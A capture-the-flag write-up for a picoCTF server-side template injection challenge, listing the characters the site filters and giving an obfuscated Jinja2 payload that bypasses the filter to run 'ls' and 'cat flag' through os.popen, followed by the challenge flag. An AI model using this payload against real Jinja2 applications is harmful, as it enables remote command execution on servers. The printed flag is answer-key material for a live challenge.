#SSTI #Sanitization
#### Challenge Description 

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:49888/)!


#### First Step 

We know that it is a Server-side Template Injection vulnerability and as you can see, there will be input sanitization according to the description.

So I tried to type {{7fois7}} to see if it is vulnerable 

![](../../PicoCTF-assets/Pasted%20image%2020260222115046.png)

And boom it rendered 49 so it is vulnerable to SSTI 


#### Second Step 

I need to detect which characters is sanitized in the website and I found 

_Blocked Characters:_

`.`

`|`

`_`

`[]`

`|join`

And after so many trial and error I manage to found a correct obfuscated payload from this [source](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/):


#### Third Step 

I found this payload 

{{config|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}

I then found that there is this 

![](../../PicoCTF-assets/Pasted%20image%2020260222121201.png)

So I modified the payload to open the flag : 

{{config|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}






Flag : picoCTF{sst1_f1lt3r_byp4ss_a9824e27}